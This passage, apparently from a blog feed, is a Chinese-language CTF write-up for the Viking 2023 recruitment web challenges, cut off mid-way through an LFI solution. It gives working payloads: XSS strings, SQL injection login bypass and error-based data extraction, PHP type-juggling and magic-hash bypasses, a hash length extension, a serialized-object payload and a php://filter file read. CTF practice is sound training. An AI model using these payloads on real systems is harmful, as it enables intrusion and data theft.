style="color:#ffcc00">我</span><span style="color:#66cc00">的<span style="color:#ff0000">脑</span><span style="color:#ff9900">子</span><span style="color:#ffcc00">疼</span><span style="color:#66cc00">的</span><span style="color:#00ffcc">要</span><span style="color:#66ccff">裂</span><span style="color:#9900cc">开</span><span style="color:#ff0000">，</span><span style="color:#ff9900">而</span><span style="color:#ffcc00">你</span><span style="color:#66cc00">呢</span><span style="color:#00ffcc">，</span><span style="color:#66ccff">你</span><span style="color:#9900cc">依</span><span style="color:#ff0000">旧</span><span style="color:#ff9900">无</span><span style="color:#ffcc00">辜</span><span style="color:#66cc00">地</span><span style="color:#00ffcc">坐</span><span style="color:#66ccff">在</span><span style="color:#9900cc">那</span><span style="color:#ff0000">里</span><span style="color:#ff9900">看</span><span style="color:#ffcc00">我</span><span style="color:#66cc00">痛</span><span style="color:#00ffcc">苦</span><span style="color:#66ccff">不</span><span style="color:#9900cc">堪</span><span style="color:#ff0000">，</span><span style="color:#ff9900">你</span><span style="color:#ffcc00">好</span><span style="color:#66cc00">狠</span><span style="color:#00ffcc">啊</span><span style="color:#66ccff">！</span></span></strong></em></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Viking 2023 Recruit WriteUps~~~</title>
    <link href="/posts/29460/"/>
    <url>/posts/29460/</url>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="原神，启动！Ⅰ"><a href="#原神，启动！Ⅰ" class="headerlink" title="原神，启动！Ⅰ"></a>原神，启动！Ⅰ</h2><p>xss入门</p><p><code>?name=&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p><em><strong><center><font color="#81ecec" size="5">vkctf{th1s&#x2F;sAb3g1nN1ng}</font></center></strong></em></p><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><p>屏蔽了一些东西</p><p><img src="/posts/29460/image-20231021234623039.png" alt="image-20231021234623039"></p><p>那就来点朴实无华的</p><p><img src="/posts/29460/image-20231021234732538.png" alt="image-20231021234732538"></p><p>flag在注释里，base64解密一下就好了</p><p><em><strong><center><font color="#81ecec" size="5">vkctf{C0ngratul4t10n!_Y0u_h4v3_f0und_th3_fl4g}</font></center></strong></em></p><h2 id="原神，启动！Ⅲ"><a href="#原神，启动！Ⅲ" class="headerlink" title="原神，启动！Ⅲ"></a>原神，启动！Ⅲ</h2><p>xss依旧</p><p>随便试下，发现是跳转到输入的地址，为<code>&lt;a&gt;</code>标签</p><p>使用<code>javascript:alert(1)</code>，添加，f12发现<code>script</code>变成了<code>scr_ipt</code>，有了过滤</p><p>用<code>&quot;</code>试试，发现被转义成了<code>&amp;quot;</code></p><p>这里用<code>&amp;#115</code>来代替<code>s</code></p><p><code>java&amp;#115cript:alert(1)</code></p><p><em><strong><center><font color="#81ecec" size="5">vkctf{W3rrrnear2success}</font></center></strong></em></p><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>sql入门</p><p>首先试试单引号</p><p>报错了<img src="/posts/29460/image-20231022003019324.png" alt="image-20231022003019324"></p><p>发现多了括号</p><p>试试万能密码<code>&#39;) or 1=1 #</code></p><p>登录成功</p><p><code>&#39;) order by 2 #</code></p><p>查出两列</p><p>因为没有回显点</p><p>所以尝试报错注入</p><p><code> &#39;) and (select updatexml(1,concat(&#39;~&#39;,(select database())),1)) #</code></p><p><img src="/posts/29460/image-20231022004840826.png" alt="image-20231022004840826"></p><p>得到数据库名为<code>viking2023DB</code></p><p><code> &#39;) and (select updatexml(1,concat(&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)) #</code></p><p><img src="/posts/29460/image-20231022004826969.png" alt="image-20231022004826969"></p><p>得到表名为<code>viking2023</code></p><p><code> &#39;) and (select updatexml(1,concat(&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;viking2023&#39;)),1)) #</code></p><p><img src="/posts/29460/image-20231022005028106.png" alt="image-20231022005028106"></p><p>得到列名为<code>flag</code></p><p><code> &#39;) and (select updatexml(1,concat(&#39;~&#39;,(select flag from viking2023DB.viking2023)),1)) #</code></p><p><img src="/posts/29460/image-20231022005127837.png" alt="image-20231022005127837"></p><p>bingo!</p><p><em><strong><center><font color="#81ecec" size="5">vking{h2llo_welc0m2_u2stc}</font></center></strong></em></p><h2 id="robot有什么作用呢？"><a href="#robot有什么作用呢？" class="headerlink" title="robot有什么作用呢？"></a>robot有什么作用呢？</h2><p>根据题目提示，访问robots.txt</p><p><img src="/posts/29460/image-20231022005231643.png" alt="image-20231022005231643"></p><p>访问<code>/Y0u_need_t0_do_0ther_th1ng.php</code></p><p>发现是反序列化</p><p><img src="/posts/29460/image-20231022005351928.png" alt="image-20231022005351928"></p><h3 id="Part-1"><a href="#Part-1" class="headerlink" title="Part 1"></a>Part 1</h3><blockquote><p>需要绕过 <code>is_numeric($a) &amp;&amp; strlen($a)&lt;=6 &amp;&amp; $a!=0 &amp;&amp; $a**2 == 0</code></p><p>要求<code>$a</code>不能为0，但是又平方要为0，真是的</p><p>试了半天，不会，搜了一下</p><blockquote><p>发现：</p><p>php小数点后超过161位做平方运算时会被截断，但是超过323位又会失效。 也就是 0.00000…1(小数点后161个0)到0.00000…1(小数点后322个0)，我们可以用科学计数法来代替，即 <code>1e-162</code></p></blockquote><p>得到</p><p><em><strong>vkctf{1_th1nk_</strong></em></p></blockquote><h3 id="Part-2"><a href="#Part-2" class="headerlink" title="Part 2"></a>Part 2</h3><blockquote><p><code>$b</code>参数需要通过<code>POST</code>获得，<code>postman</code>启动！！</p><p>要求<code>$b</code>非数字，且大于<code>2023</code></p><blockquote><p><code>is_numeric()</code> 函数会判断如果是数字和数字字符串则返回 <code>TRUE</code>，否则返回 <code>FALSE</code>，且php中弱类型比较时，会使<code>(&#39;2024a&#39; == 2024)</code>为真</p></blockquote><p><em><strong>y0u_h4v3_kn0wn</strong></em></p></blockquote><h3 id="Part-3"><a href="#Part-3" class="headerlink" title="Part 3"></a>Part 3</h3><blockquote><p><code>$c</code>和<code>$d</code>依然需要<code>POST</code>请求</p><p>这里是一个MD5碰撞</p><p><code>==</code>弱类型比较</p><p>尝试可知<code>var_dump(&quot;0e123456&quot;==&quot;0e234567&quot;); //true</code></p><p>所以我们只需要让<code>sha1($c)</code>和<code>md5($d)</code>为<code>0e</code>开头，后面全为数字就行了</p><p>顺便把前面条件绕一下</p><p>好像爆破不出来，那上网拿一个吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">c = <span class="hljs-number">10932435112</span><br>d = QNKCDZO<br></code></pre></td></tr></table></figure><p><em><strong>_s0meth1ng_ab0ut_php</strong></em></p></blockquote><h3 id="Part-4"><a href="#Part-4" class="headerlink" title="Part 4"></a>Part 4</h3><blockquote><blockquote><p><code>strpos()</code>函数查找字符串在另一字符串中第一次出现的位置，如果没有找到该字符串，则返回 <code>false</code>。</p><p>可以用数组进行绕过。</p></blockquote><p><em><strong>_and_rob0ts.txt!}</strong></em></p></blockquote><p><em><strong><center><font color="#81ecec" size="5">vkctf{1_th1nk_y0u_h4v3_kn0wn_s0meth1ng_ab0ut_php_and_rob0ts.txt!}</font></center></strong></em></p><h2 id="read-file"><a href="#read-file" class="headerlink" title="read_file"></a>read_file</h2><p>根据提示访问<code>/help.txt</code></p><p><img src="/posts/29460/image-20231023001508423.png" alt="image-20231023001508423"></p><p>让我们访问文件</p><p>一通尝试，发现<code>/flag2.txt</code>可以</p><p><img src="/posts/29460/image-20231023001608912.png" alt="image-20231023001608912"></p><p>得到用户名和密码，且提示我们用<code>/dict.txt</code></p><p><img src="/posts/29460/image-20231023001657353.png" alt="image-20231023001657353"></p><p>仔细seesee，发现一个<code>/admin</code>，狠狠访问！</p><p><code>username = admin</code></p><p><code>password=YWRtaW4xMjM=</code></p><p>发现登陆失败，哦，忘记给密码解码了，一眼base64</p><p>解码得到<code>admin123</code></p><p><img src="/posts/29460/image-20231023002044581.png" alt="image-20231023002044581"></p><p><strong><del>启动成功！</del>登陆成功！</strong></p><p>接着<code>F12</code>就得到flag了</p><p><em><strong><center><font color="#81ecec" size="5">viking{hi0t3vJ9obLo8oz8EujZ}</font></center></strong></em></p><h2 id="Hash-attack"><a href="#Hash-attack" class="headerlink" title="Hash_attack"></a>Hash_attack</h2><p><img src="/posts/29460/image-20231024124812566.png" alt="image-20231024124812566"></p><p>哈希长度拓展攻击，原理不太懂</p><p>找个别人写好的来用用</p><p>这里用的是<code>HashPump</code>（貌似库没了</p><p><img src="/posts/29460/image-20231024131137953.png" alt="image-20231024131137953"></p><blockquote><p><code>Signature</code>是提示给的<code>md5($salt.&quot;vkpass&quot;)</code></p><p><code>Data</code>是<code>pass</code>（因为判断条件<code>$password!=&quot;pass&quot;</code></p><p><code>Key Length</code>则是<code>$salt</code>+<code>$username</code>的长度</p><p><code>Data to Add</code>就随意了</p></blockquote><p>得到一串<code>hash</code>和<code>payload</code></p><p>现在就很清晰了（应该吧</p><p><img src="/posts/29460/image-20231024131735567.png" alt="image-20231024131735567"></p><p>这里记得把<code>\x</code>替换成<code>%</code>，因为post上去会有<code>urldecode()</code>操作</p><p><img src="/posts/29460/image-20231024131755326.png" alt="image-20231024131755326"></p><p><em><strong><center><font color="#81ecec" size="5">vkctf{1iU_2Hu_Xi_5Mi1}</font></center></strong></em></p><h2 id="剑来"><a href="#剑来" class="headerlink" title="剑来"></a>剑来</h2><p>访问题目，<code>F12</code>查看得知点击按钮跳转<code>flag.php</code></p><p><img src="/posts/29460/image-20231023193734369.png" alt="image-20231023193734369"></p><p>但是点了却不是<code>flag.php</code></p><p>可知是<code>302跳转</code></p><p>一般用<code>curl</code>的方式访问<code>flag.php</code></p><p>可惜</p><p><img src="/posts/29460/image-20231023193938566.png" alt="image-20231023193938566"></p><p>前面注意到<code>script</code>里会设置<code>cookie</code></p><p><img src="/posts/29460/image-20231023194015312.png" alt="image-20231023194015312"></p><p>根据题目猜测要把改成<code>admin=jianlai</code></p><p><img src="/posts/29460/image-20231023194114152.png" alt="image-20231023194114152"></p><p><em><strong><center><font color="#81ecec" size="5">vkctf{ZHi_dao_chEngRen_c8Owu_Jianla1}</font></center></strong></em></p><h2 id="签收您的gift"><a href="#签收您的gift" class="headerlink" title="签收您的gift"></a>签收您的gift</h2><p>这真的是web吗？😖😖😖</p><p><img src="/posts/29460/image-20231024162718448.png" alt="image-20231024162718448"></p><p>可以发现二维码的数据被编码了，解码就是对应的二维码图片数据了</p><p>接着，写个小脚本，或者找个<strong>小网站</strong>（<a href="https://www.lddgo.net/convert/base64-to-image">在线Base64转图片 (lddgo.net)</a>），转换成图片就行了</p><p>扫码可得十个数字</p><p><img src="/posts/29460/image-20231024165708370.png" alt="image-20231024165708370"></p><p>分析下<code>generate_qr_code()</code>函数，这里截出了有用的部分</p><p><img src="/posts/29460/image-20231024163425533.png" alt="image-20231024163425533"></p><p><img src="/posts/29460/image-20231024163937057.png" alt="image-20231024163937057"></p><blockquote><p>从1-1000中随机选择数字作为种子seed</p><p>循环十次<code>getrandbits()</code>，往reveal中增加生成的字符</p><p>循环结束后，再获取一次<code>getrandbits()</code>，并把生成的数库塞到qrcode里</p></blockquote><p>这里需要知道，当种子固定，<code>getrandbits()</code>获得的随机数也相应固定，那我就跟你们爆了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><br>res = [<span class="hljs-number">6</span>, <span class="hljs-number">252</span>, <span class="hljs-number">12</span>, <span class="hljs-number">137</span>, <span class="hljs-number">124</span>, <span class="hljs-number">102</span>, <span class="hljs-number">108</span>, <span class="hljs-number">201</span>, <span class="hljs-number">187</span>, <span class="hljs-number">200</span>]<br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br>    reveal = []<br>    random.seed(j)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        reveal.append(random.getrandbits(<span class="hljs-number">8</span>))<br>    target = random.getrandbits(<span class="hljs-number">8</span>)<br>    <span class="hljs-comment"># print(target)</span><br>    <span class="hljs-keyword">if</span> reveal == res:<br>        <span class="hljs-comment"># print(j)</span><br>        <span class="hljs-built_in">print</span>(target)<br>        <span class="hljs-comment"># print(reveal)</span><br><br></code></pre></td></tr></table></figure><p><img src="/posts/29460/image-20231024164806099.png" alt="image-20231024164806099"></p><p><em><strong><center><font color="#81ecec" size="5">viking{m1sc_0r_w2b_0r_crypt0?}</font></center></strong></em></p><h2 id="unserialization"><a href="#unserialization" class="headerlink" title="unserialization"></a>unserialization</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fuck1&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fuck again&quot;</span>;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag1.php&quot;</span>);<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;3&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>查看代码：</p><blockquote><ul><li><p><code>is_valid()</code>确保输入的<code>$s</code>的字符ASCII需要在32-125间，如果用<code>protected</code>序列化会产生<code>/0/0</code>不可见字符，不满足要求，所以使用<code>public</code></p></li><li><p>反序列化时不会调用<code>__construct()</code>，但在类即将摧毁时，会调用<code>__destruct()</code>，即调用<code>process()</code>函数</p></li><li><p>在<code>process()</code>中只有<code>op=2</code>时，才能读<code>flag.php</code></p></li></ul><p>所以写payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;2&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span> =<span class="hljs-string">&quot;wHy 1S YuAnsHen&quot;</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到：</p><p><code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:1:&quot;2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:15:&quot;wHy 1S YuAnsHen&quot;;&#125;</code></p></blockquote><p><em><strong><center><font color="#81ecec" size="5">viking{BUNmH4MHP3dZf9mkdesj}</font></center></strong></em></p><h2 id="听说你会LFI"><a href="#听说你会LFI" class="headerlink" title="听说你会LFI"></a>听说你会LFI</h2><p>提示<code>./phpinfo.php</code></p><p><img src="/posts/29460/image-20231026125819460.png" alt="image-20231026125819460"></p><p>网上搜到使用<code>pearcmd</code>的解法<a href="https://blog.csdn.net/Mrs_H/article/details/122386511">利用pearcmd.php本地文件包含（LFI）-CSDN博客</a></p><blockquote><p>在此之前我们需要确定几件事情：</p><p>1.我们要找到<code>pearcmd.php</code>的文件位置。正常情况下在<code>/usr/local/lib/php/pearcmd.php</code></p><p>2.我们要开启<code>register_argc_argv</code>选项，当然了docker的PHP镜像是默认开启的。</p><p>当我们开启register_argc_argv选项的时候，$_SERVER[‘argv’]就会生效。</p></blockquote><p>访问<code>?file=php://filter/read=convert.base64-encode/resource=/usr/local/lib/php/pearcmd.php</code></p><p>解码可以得到</p><details>    <summary><strong>点击查看</strong></summary><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span 